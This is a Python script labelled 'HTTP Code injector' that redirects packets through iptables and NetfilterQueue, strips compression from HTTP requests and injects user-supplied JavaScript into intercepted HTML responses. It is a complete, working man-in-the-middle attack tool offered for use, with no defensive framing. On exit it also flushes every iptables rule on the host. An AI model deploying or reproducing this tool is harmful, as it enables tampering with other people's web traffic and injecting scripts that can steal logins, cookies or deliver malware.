#!/usr/bin/python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import argparse
import subprocess
import re

ack_list = []

def set_load(packet,load):
    # overwrite the raw section
    packet[scapy.Raw].load=load
    # recalculate len and hashes 
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def spoof_packet(packet):
    # convert packets to scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # check if packet has HTTP request/response
    if scapy_packet.haslayer(scapy.Raw):
        load=scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            # Strip out encoding in all outgoing http request packets 
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
        elif scapy_packet[scapy.TCP].sport == 80:
            load=load.replace("</body>",options.script+"</body>")
            # recalculate content length only for html pages
            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                content_length=content_length_search.group(1)
                new_content_length=int(content_length)+len(options.script)
                load = load.replace(content_length,str(new_content_length))
        # replace the source packet if we had modified the load
        if load != scapy_packet[scapy.Raw].load:
            new_packet=set_load(scapy_packet,load)
            packet.set_payload(str(new_packet))

    # send the packet        
    packet.accept()
    
parser=argparse.ArgumentParser(description="HTTP Code injector")
parser.add_argument("-s","--script",dest="script",help="javascript in single line", required=True)
parser.add_argument("-c","--chain",dest="chain", choices=['I/O', 'FORWARD'], help="iptable chain", required=True)
parser.add_argument("-q","--queue-num",dest="queue_num",help="iptables queue number", default=0, type=int)
options = parser.parse_args()

queue = NetfilterQueue()

try:

    try:
        # forward packets
        if options.chain == 'I/O':
            # forward input chain
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
            # forward output chain
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
        else:
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
        print ("[+] forwarding packets to queue: {}".format(options.queue_num))
    except Exception as err:
        print ("[-] Something went wrong forwarding packets, possible issue could be less privilege, run as root")
        print (parser.print_help())
        exit()
    
    # register call back with queue number   
    queue.bind(options.queue_num, spoof_packet)
    # execute
    print ("Done, watch carefully")
    queue.run()

except KeyboardInterrupt:
    print ("\n[+] Detected CTRL+C... Please wait..")
    try:
        print ("Attempting to restore iptables")
        subprocess.call(["iptables", "--flush"])
    except Exception as err:
        print ("[-] Something went wrong while flusing iptables, please restore it manually")

